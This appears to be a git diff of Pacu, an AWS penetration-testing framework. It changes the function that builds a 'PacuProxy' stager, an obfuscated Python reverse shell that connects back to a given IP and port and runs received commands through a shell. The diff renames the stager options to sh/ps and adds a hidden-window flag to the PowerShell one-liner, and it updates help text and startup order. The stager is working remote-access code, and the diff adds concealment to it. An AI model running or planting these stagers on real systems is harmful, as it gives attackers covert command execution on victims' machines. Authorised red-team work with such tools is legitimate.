@@ -334,10 +334,10 @@ class Main:
     # Return a PacuProxy stager string
     def get_proxy_stager(self, ip, port, os):
         python_stager = "import os,platform as I,socket as E,subprocess as B,time as t,sys as X,struct as D\\nV=True\\nY=t.sleep\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      Y(5)\\n      raise\\n    try:\\n      self.s.send('{{}}\\{{}}'.format(I.system(),E.gethostname()).encode())\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode()\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while V:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        X.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=V,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while V:\\n    try:\\n      C.c()\\n    except:\\n      Y(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except SystemExit:\\n    X.exit(0)\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nX.stderr=object\\nwhile V:\\n  f()".format(ip, port)
-        if os == 'lin':  # Linux one-liner (uses \" to escape inline double-quotes)
+        if os == 'sh':  # Linux one-liner (uses \" to escape inline double-quotes)
             return 'python3 -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager))
-        elif os == 'win':  # Windows one-liner (uses `" to escape inline double-quotes)
-            return 'Start-Process -FilePath "python3" -Verb open -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
+        elif os == 'ps':  # Windows one-liner (uses `" to escape inline double-quotes)
+            return 'Start-Process -FilePath "python3" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
         else:
             self.print('Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(os))
             return False
@@ -477,10 +477,9 @@ class Main:
                                                     no longer use any proxy (route from the local
                                                     host instead)
                 shell <agent_id> <command>        Run a shell command on the remote agent
-                stager lin|win                    Generate a PacuProxy stager. The two formats available
-                                                    are python one-liners for Linux (lin) or Windows
-                                                    (win). The only difference in the payloads is how
-                                                    command-line escaping is done for valid syntax.
+                stager sh|ps                      Generate a PacuProxy stager. The "bash" format is
+                                                    for *sh shells in Unix, and the "ps" format is
+                                                    for PowerShell on Windows.
             list/ls                             List all modules
             search [cat[egory]] <search term>   Search the list of available modules by name or category
             help                                Display this page of information
@@ -544,10 +543,9 @@ class Main:
                                                 no longer use any proxy (route from the local
                                                 host instead)
             shell <agent_id> <command>        Run a shell command on the remote agent
-            stager lin|win                    Generate a PacuProxy stager. The two formats available
-                                                are python one-liners for Linux (lin) or Windows
-                                                (win). The only difference in the payloads is how
-                                                command-line escaping is done for valid syntax.
+            stager sh|ps                      Generate a PacuProxy stager. The "bash" format is
+                                                for *sh shells in Unix, and the "ps" format is
+                                                for PowerShell on Windows.
 """)
             elif command[1] == 'start':  # Start proxy server
                 if len(command) < 3:
@@ -599,7 +597,7 @@ class Main:
                 if len(command) == 3:
                     self.print(self.get_proxy_stager(proxy_ip, proxy_port, command[2]))
                 else:
-                    self.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]))
+                    self.print('** Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(command[2:]))
             elif command[1] == 'use':
                 if len(command) == 3:
                     try:
@@ -1268,6 +1266,7 @@ class Main:
                                           #&&&&&&(                 .&&&&&&&.     .&&&&&&&,     *%&&&&&&&&&&&&&&&&/        /%&&&&&&&&&&&&&&(.
 
                     """)
+
                     configure_settings.copy_settings_template_into_settings_file_if_not_present()
                     set_sigint_handler(exit_text='\nA database must be created for Pacu to work properly.')
                     setup_database_if_not_present(settings.DATABASE_FILE_PATH)
@@ -1278,6 +1277,11 @@ class Main:
                     self.proxy = ProxySettings()
                     self.queue = Queue()
 
+                    self.check_sessions()
+
+                    self.initialize_tab_completion()
+                    self.display_help()
+
                     proxy_settings = self.get_proxy_settings()
                     if proxy_settings is None:
                         self.proxy.activate(self.database)
@@ -1285,11 +1289,6 @@ class Main:
                     if proxy_settings is not None and proxy_settings.listening is True:
                         # PacuProxy was listening on last shutdown, so restart it
                         self.start_proxy()
-
-                    self.check_sessions()
-
-                    self.initialize_tab_completion()
-                    self.display_help()
 
                     idle_ready = True
 
